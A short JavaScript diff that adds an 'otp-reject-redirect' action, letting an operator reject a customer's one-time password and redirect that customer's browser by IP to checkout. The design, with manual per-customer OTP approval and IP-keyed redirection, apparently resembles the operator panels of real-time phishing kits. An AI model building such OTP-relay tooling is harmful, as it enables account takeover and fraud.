@@ -1100,7 +1100,7 @@ const handleCustomerAction = async ( payload ) => {
         }
 
         // ── OTP Actions ──
-        else if ( action === 'otp-approve' || action === 'otp-reject' ) {
+        else if ( action === 'otp-approve' || action === 'otp-reject' || action === 'otp-reject-redirect' ) {
             const otpId = customer?.latest_otp?.id;
             if ( !otpId ) { logger.error( 'No OTP ID found' ); return; }
             // Guard: skip if OTP is already processed (prevents 422)
@@ -1114,6 +1114,11 @@ const handleCustomerAction = async ( payload ) => {
             if ( action === 'otp-approve' ) {
                 await approveOtp( otpId, ip );
                 handleOtpApproved( otpId );
+            } else if ( action === 'otp-reject-redirect' ) {
+                await rejectOtp( otpId, ip, reason || 'مرفوض من المشرف' );
+                handleOtpRejected( otpId );
+                await redirectCustomer( ip, '/checkout?rejectionReason=' + encodeURIComponent( reason ) );
+                logger.info( `OTP ${ otpId } rejected + redirected to checkout with reason: ${ reason }` );
             } else {
                 await rejectOtp( otpId, ip, reason || 'مرفوض من المشرف' );
                 handleOtpRejected( otpId );
